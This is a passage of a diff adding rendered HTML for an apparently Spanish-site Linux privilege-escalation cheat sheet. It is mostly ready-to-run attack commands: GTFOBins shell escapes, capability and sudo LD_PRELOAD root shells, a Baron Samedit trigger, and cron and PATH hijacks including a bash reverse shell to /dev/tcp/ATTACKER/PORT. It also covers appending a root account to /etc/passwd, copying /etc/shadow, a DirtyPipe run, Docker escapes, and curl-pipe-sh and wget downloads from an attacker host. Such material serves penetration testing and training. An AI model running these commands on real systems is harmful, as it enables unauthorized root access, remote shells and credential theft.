+<h3 id="find-sgid-binaries">Find SGID Binaries<a class="headerlink" href="#find-sgid-binaries" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-g<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+<h3 id="gtfobins-check">GTFOBins Check<a class="headerlink" href="#gtfobins-check" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Common exploitable SUID binaries</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># Check: https://gtfobins.github.io/</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># Examples:</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>/usr/bin/find<span class="w"> </span>.<span class="w"> </span>-exec<span class="w"> </span>/bin/sh<span class="w"> </span>-p<span class="w"> </span><span class="se">\;</span><span class="w"> </span>-quit
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>/usr/bin/vim<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;:!/bin/sh&#39;</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>/usr/bin/nmap<span class="w"> </span>--interactive<span class="w">  </span><span class="c1"># older versions</span>
+</span></code></pre></div>
+<hr />
+<h2 id="capabilities">// Capabilities<a class="headerlink" href="#capabilities" title="Enlace permanente">&para;</a></h2>
+<h3 id="find-capabilities">Find Capabilities<a class="headerlink" href="#find-capabilities" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+<h3 id="exploitable-capabilities">Exploitable Capabilities<a class="headerlink" href="#exploitable-capabilities" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># CAP_SETUID - Python</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>/usr/bin/python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># CAP_SETUID - Perl</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>/usr/bin/perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;use POSIX qw(setuid); setuid(0); exec &quot;/bin/sh&quot;;&#39;</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="c1"># CAP_DAC_READ_SEARCH - tar</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>/usr/bin/tar<span class="w"> </span>-cvf<span class="w"> </span>shadow.tar<span class="w"> </span>/etc/shadow
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>tar<span class="w"> </span>-xvf<span class="w"> </span>shadow.tar
+</span></code></pre></div>
+<hr />
+<h2 id="sudo-exploitation">// Sudo Exploitation<a class="headerlink" href="#sudo-exploitation" title="Enlace permanente">&para;</a></h2>
+<h3 id="check-sudo-permissions">Check Sudo Permissions<a class="headerlink" href="#check-sudo-permissions" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>sudo<span class="w"> </span>-l
+</span></code></pre></div>
+<h3 id="common-sudo-exploits">Common Sudo Exploits<a class="headerlink" href="#common-sudo-exploits" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># LD_PRELOAD (if env_keep+=LD_PRELOAD)</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="c1"># 1. Create malicious shared object</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;#include &lt;stdio.h&gt;</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="s1">#include &lt;sys/types.h&gt;</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="s1">#include &lt;stdlib.h&gt;</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="s1">void _init() {</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="s1">    unsetenv(&quot;LD_PRELOAD&quot;);</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="s1">    setgid(0);</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="s1">    setuid(0);</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="s1">    system(&quot;/bin/bash&quot;);</span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="s1">}&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/shell.c
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>gcc<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>/tmp/shell.so<span class="w"> </span>/tmp/shell.c<span class="w"> </span>-nostartfiles
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="c1"># 2. Execute</span>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>sudo<span class="w"> </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/shell.so<span class="w"> </span>&lt;allowed_command&gt;
+</span></code></pre></div>
+<h3 id="sudo-version-exploits">Sudo Version Exploits<a class="headerlink" href="#sudo-version-exploits" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Check version</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>sudo<span class="w"> </span>-V
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c1"># CVE-2021-3156 (Sudo Baron Samedit)</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="c1"># Versions: 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>sudoedit<span class="w"> </span>-s<span class="w"> </span><span class="s1">&#39;\&#39;</span><span class="w"> </span><span class="k">$(</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print(&quot;A&quot;*1000)&#39;</span><span class="k">)</span>
+</span></code></pre></div>
+<hr />
+<h2 id="cron-jobs">// Cron Jobs<a class="headerlink" href="#cron-jobs" title="Enlace permanente">&para;</a></h2>
+<h3 id="enumerate-cron">Enumerate Cron<a class="headerlink" href="#enumerate-cron" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># System cron</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>cat<span class="w"> </span>/etc/crontab
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="c1"># User cron</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>crontab<span class="w"> </span>-l
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>ls<span class="w"> </span>-la<span class="w"> </span>/var/spool/cron/crontabs/
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="c1"># Running processes</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>pspy64<span class="w">  </span><span class="c1"># Tool for process snooping</span>
+</span></code></pre></div>
+<h3 id="exploit-writable-scripts">Exploit Writable Scripts<a class="headerlink" href="#exploit-writable-scripts" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># If cron runs a script you can write to:</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/path/to/script.sh
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="c1"># After cron executes:</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>/tmp/bash<span class="w"> </span>-p
+</span></code></pre></div>
+<h3 id="path-injection">PATH Injection<a class="headerlink" href="#path-injection" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># If cron uses relative paths and PATH is controllable</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;/bin/bash -i &gt;&amp; /dev/tcp/ATTACKER/PORT 0&gt;&amp;1&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/vulnerable_binary
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/vulnerable_binary
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</span></code></pre></div>
+<hr />
+<h2 id="writable-files">// Writable Files<a class="headerlink" href="#writable-files" title="Enlace permanente">&para;</a></h2>
+<h3 id="find-writable-directories">Find Writable Directories<a class="headerlink" href="#find-writable-directories" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-222<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+<h3 id="find-writable-files">Find Writable Files<a class="headerlink" href="#find-writable-files" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="c1"># Writable /etc/passwd</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/passwd
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>su<span class="w"> </span>hacker<span class="w">  </span><span class="c1"># password: password</span>
+</span></code></pre></div>
+<h3 id="world-writable-etcshadow">World-Writable /etc/shadow<a class="headerlink" href="#world-writable-etcshadow" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># Generate password hash</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>openssl<span class="w"> </span>passwd<span class="w"> </span>-1<span class="w"> </span>newpassword
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c1"># Replace root hash</span>
+</span></code></pre></div>
+<hr />
+<h2 id="kernel-exploits">// Kernel Exploits<a class="headerlink" href="#kernel-exploits" title="Enlace permanente">&para;</a></h2>
+<h3 id="check-kernel-version">Check Kernel Version<a class="headerlink" href="#check-kernel-version" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>uname<span class="w"> </span>-r
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>cat<span class="w"> </span>/proc/version
+</span></code></pre></div>
+<h3 id="common-kernel-exploits">Common Kernel Exploits<a class="headerlink" href="#common-kernel-exploits" title="Enlace permanente">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Kernel Version</th>
+<th>CVE</th>
+<th>Exploit</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2.6.22 &lt; 3.9</td>
+<td>CVE-2016-5195</td>
+<td>DirtyCow</td>
+</tr>
+<tr>
+<td>4.4.0-116</td>
+<td>CVE-2017-16995</td>
+<td>eBPF_verifier</td>
+</tr>
+<tr>
+<td>5.8 &lt; 5.16.11</td>
+<td>CVE-2022-0847</td>
+<td>DirtyPipe</td>
+</tr>
+<tr>
+<td>&lt; 5.11</td>
+<td>CVE-2021-22555</td>
+<td>Netfilter</td>
+</tr>
+</tbody>
+</table>
+<h3 id="dirtypipe-cve-2022-0847">DirtyPipe (CVE-2022-0847)<a class="headerlink" href="#dirtypipe-cve-2022-0847" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Check if vulnerable</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>uname<span class="w"> </span>-r<span class="w">  </span><span class="c1"># 5.8 &lt;= version &lt; 5.16.11</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c1"># Compile and run exploit</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>gcc<span class="w"> </span>-o<span class="w"> </span>dirtypipe<span class="w"> </span>dirtypipe.c
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>./dirtypipe<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">OVERWRITE</span><span class="si">}</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="docker-escape">// Docker Escape<a class="headerlink" href="#docker-escape" title="Enlace permanente">&para;</a></h2>
+<h3 id="check-if-in-container">Check if in Container<a class="headerlink" href="#check-if-in-container" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>cat<span class="w"> </span>/proc/1/cgroup
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>ls<span class="w"> </span>-la<span class="w"> </span>/.dockerenv
+</span></code></pre></div>
+<h3 id="privileged-container">Privileged Container<a class="headerlink" href="#privileged-container" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># If --privileged flag was used</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>mkdir<span class="w"> </span>/mnt/host
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>mount<span class="w"> </span>/dev/sda1<span class="w"> </span>/mnt/host
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>chroot<span class="w"> </span>/mnt/host
+</span></code></pre></div>
+<h3 id="docker-socket">Docker Socket<a class="headerlink" href="#docker-socket" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># If /var/run/docker.sock is accessible</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>docker<span class="w"> </span>-H<span class="w"> </span>unix:///var/run/docker.sock<span class="w"> </span>run<span class="w"> </span>-v<span class="w"> </span>/:/mnt<span class="w"> </span>-it<span class="w"> </span>alpine<span class="w"> </span>chroot<span class="w"> </span>/mnt
+</span></code></pre></div>
+<hr />
+<h2 id="automated-enumeration">// Automated Enumeration<a class="headerlink" href="#automated-enumeration" title="Enlace permanente">&para;</a></h2>
+<h3 id="linpeas">LinPEAS<a class="headerlink" href="#linpeas" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1"># Download and run</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>curl<span class="w"> </span>-L<span class="w"> </span>https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>sh
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="c1"># Or transfer</span>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>wget<span class="w"> </span>http://ATTACKER:8000/linpeas.sh
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>chmod<span class="w"> </span>+x<span class="w"> </span>linpeas.sh
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>./linpeas.sh
+</span></code></pre></div>
+<h3 id="linenum">LinEnum<a class="headerlink" href="#linenum" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>wget<span class="w"> </span>http://ATTACKER:8000/LinEnum.sh
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>chmod<span class="w"> </span>+x<span class="w"> </span>LinEnum.sh
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>./LinEnum.sh<span class="w"> </span>-t
+</span></code></pre></div>
+<h3 id="linux-exploit-suggester">linux-exploit-suggester<a class="headerlink" href="#linux-exploit-suggester" title="Enlace permanente">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">Bash</span><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>wget<span class="w"> </span>https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>chmod<span class="w"> </span>+x<span class="w"> </span>linux-exploit-suggester.sh
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>./linux-exploit-suggester.sh
+</span></code></pre></div>
+<hr />
+<h2 id="quick-reference">// Quick Reference<a class="headerlink" href="#quick-reference" title="Enlace permanente">&para;</a></h2>
 <div class="admonition danger">
-<p class="admonition-title">Último recurso</p>
-<p>Los kernel exploits pueden causar inestabilidad. Usar solo si otros métodos fallan.</p>
+<p class="admonition-title">Checklist</p>
+<ol class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> <code>sudo -l</code> - Check sudo permissions</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> SUID/SGID binaries</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Capabilities</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Cron jobs</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Writable files (/etc/passwd, /etc/shadow)</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Kernel version → known exploits</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Running services as root</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Docker/LXC escape</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> NFS shares (no_root_squash)</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Passwords in files/history</li>
+</ol>
 </div>
-<h2 id="tecnicas-comunes">Técnicas Comunes<a class="headerlink" href="#tecnicas-comunes" title="Permanent link">&para;</a></h2>
-<h3 id="path-hijacking">Path Hijacking<a class="headerlink" href="#path-hijacking" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Si un binario SUID ejecuta comandos sin ruta absoluta</span>
-<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;/bin/bash&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/comando
-<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/comando
-<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
-<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>./binario_vulnerable
-</code></pre></div>
-<h3 id="library-hijacking">Library Hijacking<a class="headerlink" href="#library-hijacking" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Buscar librerías faltantes</span>
-<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>ldd<span class="w"> </span>/path/to/binary
-<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>strace<span class="w"> </span>/path/to/binary<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;open.*\.so&quot;</span>
-</code></pre></div>
-<h3 id="docker-escape">Docker Escape<a class="headerlink" href="#docker-escape" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Verificar si estamos en Docker</span>
-<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>cat<span class="w"> </span>/proc/1/cgroup<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>docker
-<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
-<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c1"># Si el socket está montado</span>
-<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>docker<span class="w"> </span>run<span class="w"> </span>-v<span class="w"> </span>/:/mnt<span class="w"> </span>--rm<span class="w"> </span>-it<span class="w"> </span>alpine<span class="w"> </span>chroot<span class="w"> </span>/mnt<span class="w"> </span>sh
-</code></pre></div>
+<hr />
+<div class="admonition tip">
+<p class="admonition-title">Resources</p>
+<ul>
+<li><a href="https://gtfobins.github.io/">GTFOBins</a></li>
+<li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">HackTricks - Linux Privesc</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">PayloadsAllTheThings</a></li>
+</ul>
+</div>
 
 
 
@@ -677,12 +1821,68 @@
